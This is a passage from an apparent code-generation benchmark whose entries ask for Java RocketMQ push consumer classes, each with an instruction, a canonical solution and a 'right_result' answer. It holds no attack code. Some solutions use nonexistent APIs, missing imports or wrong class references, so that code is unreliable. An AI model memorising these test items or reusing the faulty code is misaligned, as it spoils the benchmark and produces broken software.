System.out.println(\"LMQPushConsumer started.\");\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n            System.out.println(\"LMQPushConsumer shut down.\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 362,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer for processing order-related messages. The consumer should be initialized with Spring and configured to consume messages from a specified topic.\n\nClass Description: The OrderPushConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specified topic, configures consumption settings, and processes incoming messages asynchronously.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- topicName: String - The name of the topic to subscribe to (injected from properties)\n- namesrvAddr: String - The address of the NameServer (injected from properties)\n\nMethods:\n- init(): void - Initializes the consumer with configuration settings and starts it. This method is automatically called after construction due to the @PostConstruct annotation.\n  - Input: None\n  - Output: None\n  - Description: Configures the consumer with NameServer address, subscription details, batch size, and consumption strategy. Registers a message listener and starts the consumer.\n\n- (implicit) MessageListenerConcurrently.consumeMessage(List<MessageExt>, ConsumeConcurrentlyContext) -> ConsumeConcurrentlyStatus - Handles incoming messages\n  - Input: \n    - msgs: List<MessageExt> - List of received messages\n    - context: ConsumeConcurrentlyContext - Context for concurrent consumption\n  - Output: ConsumeConcurrentlyStatus - Status indicating whether message processing was successful\n  - Description: The anonymous implementation of MessageListenerConcurrently that processes batches of messages. Currently returns CONSUME_SUCCESS for all messages.",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class OrderPushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @PostConstruct\n    public void init() throws Exception {\n        consumer = new DefaultMQPushConsumer(\"create_order_consumer_group2\");\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(topicName,\"*\");\n        consumer.setConsumeMessageBatchMaxSize(100);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n        consumer.start();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class OrderPushConsumer {\n\n    @Value(\"${rocketmq.topic}\")\n    private String topicName;\n\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n\n    private DefaultMQPushConsumer consumer;\n\n    @PostConstruct\n    public void init() {\n        try {\n            consumer = new DefaultMQPushConsumer(\"order-consumer-group\");\n            consumer.setNamesrvAddr(namesrvAddr);\n            consumer.subscribe(topicName, \"*\");\n            consumer.setConsumeMessageBatchMaxSize(10);\n            consumer.registerMessageListener((List<MessageExt> msgs, ConsumeConcurrentlyContext context) -> {\n                for (MessageExt msg : msgs) {\n                    // Process message logic here\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            });\n            consumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 363,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to monitor and handle offset moved events in a message queue system.\n\nClass Description: The RocketMQConsumer class is designed to consume messages from a RocketMQ broker, specifically monitoring for offset moved events. It uses a push-based consumption model with a single-threaded listener to process messages. The class handles message subscription, listener configuration, and consumer lifecycle management.\n\nAttributes:\n- defaultMQPushConsumer: DefaultMQPushConsumer - The main consumer instance that connects to RocketMQ and handles message consumption\n- monitorListener: MonitorListener - (Assumed from context) Listener interface for reporting delete message events\n\nMethods:\n- RocketMQConsumer(RPCHook, String) -> void - Constructor that initializes the consumer with RPC hook and NameServer address\n- generateInstanceName(String) -> String - Generates a unique instance name for the consumer\n- configureMessageListener() -> void - Configures the message listener to handle incoming messages\n- subscribeToTopic() -> void - Subscribes to the offset moved event topic\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.topic.TopicValidator;\nimport org.apache.rocketmq.remoting.RPCHook;\n\npublic class RocketMQConsumer {\n\n    private final DefaultMQPushConsumer defaultMQPushConsumer;\n\n    public RocketMQConsumer(RPCHook rpcHook, String namesrvAddr) throws MQClientException {\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(MixAll.MONITOR_CONSUMER_GROUP, rpcHook);\n        this.defaultMQPushConsumer.setNamesrvAddr(namesrvAddr);\n        this.defaultMQPushConsumer.setInstanceName(generateInstanceName(namesrvAddr));\n        this.defaultMQPushConsumer.setConsumeThreadMin(1);\n        this.defaultMQPushConsumer.setConsumeThreadMax(1);\n        \n        configureMessageListener();\n        subscribeToTopic();\n    }\n\n    private String generateInstanceName(String namesrvAddr) {\n        return \"MonitorService_\" + (System.currentTimeMillis() + RandomUtils.nextInt(0, Integer.MAX_VALUE) + namesrvAddr).hashCode();\n    }\n\n    private void configureMessageListener() {\n        this.defaultMQPushConsumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                try {\n                    OffsetMovedEvent ome =\n                        OffsetMovedEvent.decode(msgs.get(0).getBody(), OffsetMovedEvent.class);\n\n                    DeleteMsgsEvent deleteMsgsEvent = new DeleteMsgsEvent();\n                    deleteMsgsEvent.setOffsetMovedEvent(ome);\n                    deleteMsgsEvent.setEventTimestamp(msgs.get(0).getStoreTimestamp());\n\n                    MonitorService.this.monitorListener.reportDeleteMsgsEvent(deleteMsgsEvent);\n                } catch (Exception e) {\n                }\n\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    private void subscribeToTopic() throws MQClientException {\n        this.defaultMQPushConsumer.subscribe(TopicValidator.RMQ_SYS_OFFSET_MOVED_EVENT, \"*\");\n    }\n\n    public void start() throws MQClientException {\n        this.defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() {\n        this.defaultMQPushConsumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class RocketMQConsumer {\n    private DefaultMQPushConsumer defaultMQPushConsumer;\n    private MonitorListener monitorListener;\n\n    public RocketMQConsumer(RPCHook rpcHook, String nameServerAddress) {\n        String instanceName = generateInstanceName(\"RocketMQConsumer\");\n        defaultMQPushConsumer = new DefaultMQPushConsumer(instanceName, rpcHook);\n        defaultMQPushConsumer.setNamesrvAddr(nameServerAddress);\n        configureMessageListener();\n        subscribeToTopic();\n    }\n\n    private String generateInstanceName(String baseName) {\n        return baseName + \"-\" + System.currentTimeMillis();\n    }\n\n    private void configureMessageListener() {\n        defaultMQPushConsumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                if (monitorListener != null) {\n                    monitorListener.onMessage(msg);\n                }\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    private void subscribeToTopic() {\n        try {\n            defaultMQPushConsumer.subscribe(\"OFFSET_MOVED_EVENT\", \"*\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        try {\n            defaultMQPushConsumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        defaultMQPushConsumer.shutdown();\n    }\n\n    public void setMonitorListener(MonitorListener monitorListener) {\n        this.monitorListener = monitorListener;\n    }\n\n    interface MonitorListener {\n        void onMessage(MessageExt message);\n    }\n}\n```"
  },
  {
    "Task_id": 365,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to asynchronously receive and process messages from a specified topic.\n\nClass Description: The PushConsumer class provides a wrapper around RocketMQ's DefaultMQPushConsumer to simplify message consumption. It handles consumer initialization, topic subscription, message listening, and lifecycle management.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The underlying RocketMQ push consumer instance\n\nMethods:\n- PushConsumer(String consumerGroup, String namesrvAddr) -> void - Constructor that initializes the consumer with a consumer group and NameServer address\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- setConsumeFromWhere(ConsumeFromWhere consumeFromWhere) -> void - Sets the consumption starting point (e.g., from last offset or earliest)\n- setConsumeTimestamp(String consumeTimestamp) -> void - Sets the timestamp for consumption starting point\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a callback for processing received messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n\nNested Class:\n- SimpleMessageListener: MessageListenerConcurrently - A basic message listener implementation that prints received messages and returns success status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class PushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void setConsumeFromWhere(ConsumeFromWhere consumeFromWhere) {\n        consumer.setConsumeFromWhere(consumeFromWhere);\n    }\n\n    public void setConsumeTimestamp(String consumeTimestamp) {\n        consumer.setConsumeTimestamp(consumeTimestamp);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            System.out.printf(Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.consumer.rebalance.AllocateMessageQueueAveragely;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.protocol.heartbeat.ConsumeFromWhere;\n\npublic class PushConsumer {\n    private final DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setMessageModel(org.apache.rocketmq.common.protocol.heartbeat.MessageModel.CLUSTERING);\n        consumer.setConcurrentCount(1);\n        consumer.setAllocateMessageQueueStrategy(new AllocateMessageQueueAveragely());\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        try {\n            consumer.subscribe(topic, subExpression);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void setConsumeFromWhere(ConsumeFromWhere consumeFromWhere) {\n        consumer.setConsumeFromWhere(consumeFromWhere);\n    }\n\n    public void setConsumeTimestamp(String consumeTimestamp) {\n        consumer.setConsumeTimestamp(consumeTimestamp);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() {\n        try {\n            consumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"Received message: %s%n\", new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 368,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously receive and process messages from a specified topic.\n\nClass Description: The RocketMQConsumer class provides functionality to initialize, configure, and manage a RocketMQ push consumer. It allows subscribing to topics, registering message listeners, and controlling the consumer lifecycle.\n\nAttributes:\n- pushConsumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- initializeConsumer(String consumerGroup, String namesrvAddr) -> void - Initializes the consumer with a consumer group and NameServer address. Sets consumption strategy to start from last offset and message model to clustering.\n- subscribeToTopic(String topic, String tagExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a concurrent message listener to handle incoming messages\n- startConsumer() -> void - Starts the consumer to begin receiving messages\n- shutdownConsumer() -> void - Gracefully shuts down the consumer instance",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\nimport java.util.List;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer pushConsumer;\n\n    public void initializeConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        pushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        pushConsumer.setNamesrvAddr(namesrvAddr);\n        pushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        pushConsumer.setMessageModel(MessageModel.CLUSTERING);\n    }\n\n    public void subscribeToTopic(String topic, String tagExpression) throws MQClientException {\n        pushConsumer.subscribe(topic, tagExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        pushConsumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                return listener.consumeMessage(msgs, context);\n            }\n        });\n    }\n\n    public void startConsumer() throws MQClientException {\n        pushConsumer.start();\n    }\n\n    public void shutdownConsumer() {\n        pushConsumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageSelector;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class RocketMQConsumer {\n    private DefaultMQPushConsumer pushConsumer;\n\n    public void initializeConsumer(String consumerGroup, String namesrvAddr) {\n        pushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        pushConsumer.setNamesrvAddr(namesrvAddr);\n        pushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        pushConsumer.setMessageModel(MessageModel.CLUSTERING);\n    }\n\n    public void subscribeToTopic(String topic, String tagExpression) {\n        if (tagExpression.isEmpty()) {\n            pushConsumer.subscribe(topic, \"*\");\n        } else {\n            pushConsumer.subscribe(topic, MessageSelector.bySql(\"TAGS IN (\" + tagExpression + \")\"));\n        }\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        pushConsumer.registerMessageListener(listener);\n    }\n\n    public void startConsumer() throws MQClientException {\n        pushConsumer.start();\n    }\n\n    public void shutdownConsumer() {\n        pushConsumer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 369,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to subscribe to messages from a specified topic and process them asynchronously.\n\nClass Description: The PushConsumer class is a RocketMQ message consumer that uses push mode to receive messages from a message queue. It handles message subscription, listener registration, and consumer lifecycle management.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- PushConsumer(String consumerGroup, String namesrvAddr) -> void - Constructor that initializes the consumer with a consumer group and NameServer address\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a message listener to handle incoming messages\n- start() -> void - Starts the consumer to begin receiving messages\n- shutdown() -> void - Shuts down the consumer gracefully\n\nNested Class:\n- SimpleMessageListener: MessageListenerConcurrently - A basic message listener implementation that prints received messages\n  Methods:\n  - consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) -> ConsumeConcurrentlyStatus - Processes received messages and returns consumption status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\nimport java.util.List;\n\npublic class PushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.setMessageModel(MessageModel.BROADCASTING);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                                                      ConsumeConcurrentlyContext context) {\n            System.out.printf(Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.List;\n\npublic class PushConsumer {\n    private final DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws Exception {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            for (MessageExt msg : msgs) {\n                System.out.println(\"Received message: \" + new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 370,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to subscribe to messages from a specified topic, process them using an orderly message listener, and manage the consumer lifecycle.\n\nClass Description: The Consumer class encapsulates the functionality of a RocketMQ push consumer that subscribes to a topic, processes messages in order, and provides methods to start and stop the consumer.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- consumerGroup: String - The consumer group name for this consumer\n- topic: String - The topic to subscribe to\n- subExpression: String - The tag expression for message filtering\n\nMethods:\n- Consumer(String, String, String) -> None - Constructor that initializes the consumer group, topic, and subscription expression\n- initialize() -> None - Initializes the consumer instance with basic configuration and subscription\n- start() -> None - Registers the message listener and starts the consumer\n- shutdown() -> None - Gracefully shuts down the consumer",
    "Canonical_solution": "import java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerOrderly;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class Consumer {\n\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subExpression;\n\n    public Consumer(String consumerGroup, String topic, String subExpression) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subExpression = subExpression;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void start() throws MQClientException {\n        consumer.registerMessageListener(new MessageListenerOrderly() {\n            AtomicLong consumeTimes = new AtomicLong(0);\n\n            @Override\n            public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n                context.setAutoCommit(true);\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                this.consumeTimes.incrementAndGet();\n                if ((this.consumeTimes.get() % 2) == 0) {\n                    return ConsumeOrderlyStatus.SUCCESS;\n                } else if ((this.consumeTimes.get() % 5) == 0) {\n                    context.setSuspendCurrentQueueTimeMillis(3000);\n                    return ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;\n                }\n                return ConsumeOrderlyStatus.SUCCESS;\n            }\n        });\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class Consumer {\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subExpression;\n\n    public Consumer(String consumerGroup, String topic, String subExpression) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subExpression = subExpression;\n    }\n\n    public void initialize() {\n        try {\n            consumer = new DefaultMQPushConsumer(consumerGroup);\n            consumer.setNamesrvAddr(\"localhost:9876\");\n            consumer.subscribe(topic, subExpression);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        try {\n            consumer.registerMessageListener(new MessageListenerOrderly() {\n                @Override\n                public ConsumeOrderlyStatus consumeMessage(List<MessageExt> messages, ConsumeOrderlyContext context) {\n                    for (MessageExt message : messages) {\n                        System.out.printf(\"Received message: %s%n\", new String(message.getBody()));\n                    }\n                    return ConsumeOrderlyStatus.CONSUME_SUCCESS;\n                }\n            });\n            consumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 371,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ ordered message consumer using the DefaultMQPushConsumer for push-based message consumption with ordered message processing.\n\nClass Description: The RocketMQOrderedConsumer class provides functionality to consume messages from RocketMQ in an ordered manner. It handles consumer initialization, topic subscription, message listening, and consumer lifecycle management. The class includes an inner class for ordered message processing.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The main consumer instance that handles message consumption from RocketMQ\n\nMethods:\n- RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) -> void - Constructor that initializes the consumer with NameServer address and consumer group\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerOrderly listener) -> void - Registers an ordered message listener for processing incoming messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n\nInner Class:\n- OrderedMessageListener: MessageListenerOrderly - Implements ordered message processing logic with consumeMessage method\n  - consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) -> ConsumeOrderlyStatus - Processes a batch of messages and returns consumption status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerOrderly;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class RocketMQOrderedConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerOrderly listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class OrderedMessageListener implements MessageListenerOrderly {\n        @Override\n        public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n            System.out.printf(System.currentTimeMillis() + \",\" + Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeOrderlyStatus.SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageListenerOrderly;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class RocketMQOrderedConsumer {\n    private final DefaultMQPushConsumer consumer;\n\n    public RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerOrderly listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class OrderedMessageListener implements MessageListenerOrderly {\n        @Override\n        public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"Received message: %s%n\", new String(msg.getBody()));\n            }\n            return ConsumeOrderlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}\n```"
  },
